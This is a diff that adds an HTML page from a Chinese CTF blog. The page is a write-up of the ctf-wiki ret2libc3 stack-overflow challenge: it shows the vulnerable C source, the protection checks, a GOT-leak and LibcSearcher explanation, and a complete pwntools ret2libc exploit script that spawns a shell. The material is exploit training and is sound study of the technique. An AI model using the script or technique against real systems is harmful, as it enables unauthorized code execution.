@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="hollk">
+
+
+    <meta name="subtitle" content="ret2text">
+
+
+    <meta name="description" content="说人话，讲清楚，负责到底">
+
+
+    <meta name="keywords" content="ret2text,二进制,pwn,ctf-wiki">
+
+
+<title>好好说话之ret2libc3 | Hollk&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Hollk&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">主页</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">关于我</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Hollk&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">主页</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">关于我</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">好好说话之ret2libc3</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">hollk</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">April 29, 2020&nbsp;&nbsp;15:58:27</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%A0%88%E6%BA%A2%E5%87%BA/">二进制--栈溢出</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>题目路径：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/ctf-challenges/</span>pwn<span class="regexp">/stackoverflow/</span>ret2libc<span class="regexp">/ret2libc3</span></span><br></pre></td></tr></table></figure>
+
+<p>看一下C代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf2[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">secure</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> secretcode, input;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    secretcode = rand();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;input);</span><br><span class="line">    <span class="keyword">if</span>(input == secretcode)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"no_shell_QQ"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"No surprise anymore, system disappeard QQ.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Can you find it !?"</span>);</span><br><span class="line">    gets(buf1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Checksec查看一下程序保护机制：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec ret2libc3</span></span><br><span class="line">[*] '/home/hollk/ctf-challenges/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>该程序为32位程序并且开启了NX保护，本题在ret2libc2的基础上去掉了system函数地址。所以这道题需要找到system函数地址和/bin/sh字符串的地址。IDA查看一下main函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"No surprise anymore, system disappeard QQ."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Can you find it !?"</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还是gets函数接收存在溢出点，v4变量距离esp指针0x1c，距离ebp指针0x64，所以v4其实地址距离ret返回地址0x6c+4个字节</p>
+<p>接下来需要考虑的是如何得到system函数的地址，主要利用两点：</p>
+<ul>
+<li>system函数属于libc，而libc.so同台链接库中的函数之间相对偏移是固定的</li>
+<li>即使开启了ASLR保护，也只针对地址中间位进行随机，最低的12位不会发生改变</li>
+</ul>
+<p>所以如果知道libc中某个函数的地址，哭了一确定该程序利用的libc，进而通过偏移获取system函数的地址</p>
+<p>接下来需要做的是找到libc中某个函数的地址，一般常用的方法就是got表泄露，即输出某个函数对应的got表项的内容。由于libc的延迟绑定机制，做题时需要泄露已经执行过的函数的地址</p>
+<p>最后根据上述步骤得到libc，通过在程序中查询偏移，计算出system的地址，可以通过LibcSearcher这个工具来代替繁琐的查找步骤</p>
+<p>libc中不只有system函数，还有/bin/sh字符串，也可以通过偏移获得/bin/sh字符串地址</p>
+<p>这道题我们选用_libc_start_main的地址，因为这是程序最初被执行的地方</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> _start(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _libc_start_main(main);</span><br><span class="line">  <span class="keyword">do</span>&#123;</span><br><span class="line">    </span><br><span class="line">  &#125;<span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用的思路如下：</p>
+<ul>
+<li>泄露_libc_start_main地址</li>
+<li>获取libc版本</li>
+<li>通过偏移计算出system函数地址以及/bin/sh的地址</li>
+<li>再次执行程序</li>
+<li>触发栈溢出执行system(‘/bin/sh’)</li>
+</ul>
+<p>EXP：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">'./ret2libc3'</span>) <span class="comment">#导入文件</span></span><br><span class="line">ret2libc3 = ELF(<span class="string">'./ret2libc3'</span>) <span class="comment">#进行elf文件逆向</span></span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">'puts'</span>] <span class="comment">#获取puts函数的PLT表地址</span></span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">'__libc_start_main'</span>] <span class="comment">#获取linc_start_main got表地址</span></span><br><span class="line">main = ret2libc3.symbols[<span class="string">'main'</span>] <span class="comment">#获取main函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露libc_start_main获得地址并且再次返回main函数</span></span><br><span class="line">payload = flat([<span class="string">'hollkdig'</span> * <span class="number">14</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">'Can you find it !?'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#已经获得了libc_start_main的got表地址</span></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>]) <span class="comment">#获取接收的后4位字符并且转换成为大端序</span></span><br><span class="line"><span class="comment">#通过LibcSearcher找到libc版本</span></span><br><span class="line">libc = LibcSearcher(<span class="string">'__libc_start_main'</span>, libc_start_main_addr) </span><br><span class="line"><span class="comment">#在找到libc版本后通过dump函数找到_libc_start_main函数的偏移，通过当前libc_start_main地址减去偏移的到libc的基地址</span></span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line"><span class="comment">#通过dump函数找到当前版本的system函数的偏移量，加上libc的基地址得到system函数的地址</span></span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"><span class="comment">#通过dump函数找到当前版本的bin/sh字符串的偏移量，加上libc的基地址得到bin/sh字符串的地址</span></span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get shell"</span></span><br><span class="line">payload = flat([<span class="string">'hollkdig'</span> * <span class="number">13</span>, system_addr, <span class="string">'b'</span>*<span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>第二个payload用104个字节填满栈空间是因为第二次调用main函数的时候可能缺少了栈初始化的过程，第二次调用的时候并不是从一开始的OPE进入的，所以出现了少8位的情况，可以使用动态调试器修改内存地址进行调试计算</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>hollk</span>
+                    </p>
+                
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>一起努力，位列仙班</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/"># pwn,栈溢出</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/04/29/%E5%A5%BD%E5%A5%BD%E8%AF%B4%E8%AF%9D%E4%B9%8Bret2csu/">好好说话之ret2csu</a>
+            
+            
+            <a class="next" rel="next" href="/2020/04/29/%E5%A5%BD%E5%A5%BD%E8%AF%B4%E8%AF%9D%E4%B9%8Bret2libc2/">好好说话之ret2libc2</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© hollk | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
